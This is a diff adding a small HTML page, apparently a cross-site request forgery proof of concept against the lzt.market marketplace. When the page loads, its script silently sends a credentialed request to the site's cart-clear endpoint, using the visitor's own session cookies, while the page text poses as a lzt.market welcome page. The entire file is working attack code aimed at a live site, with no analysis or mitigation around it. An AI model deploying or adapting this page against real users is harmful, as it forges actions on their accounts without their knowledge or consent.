@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Пример выполнения запроса с использованием cookie</title>
+    <script>
+        window.onload = function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("get", "https://lzt.market/cart-clear", true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.withCredentials = true;
+            xhr.send();
+        };
+    </script>
+</head>
+<body>
+<h1>Добро пожаловать на lzt.market!</h1>
+<p>Ваша корзина будет очищена автоматически при загрузке этой страницы.</p>
+</body>
+</html>
